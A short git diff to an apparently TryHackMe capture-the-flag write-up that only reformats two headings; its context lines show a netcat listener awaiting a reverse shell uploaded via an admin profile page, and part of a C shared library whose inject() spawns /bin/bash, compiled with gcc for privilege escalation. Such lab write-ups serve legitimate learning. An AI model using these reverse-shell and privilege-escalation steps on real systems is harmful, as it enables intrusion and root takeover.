@@ -63,7 +63,7 @@ This is the dir that has our revshell i found it in the admin  /profile.php  sou
 
 ![Screenshot_29](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/cb24afb2-0e7a-48e7-ac78-6ea2f4e66395)
 
-# Initial Access
+# Initial Access:
 
 ```sh
 nc -lvnp 4444             
@@ -152,7 +152,7 @@ void inject() {
  	system("/bin/bash");
 }
 ```
-compile the code:
+# compile the code:
 ```sh
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 and run
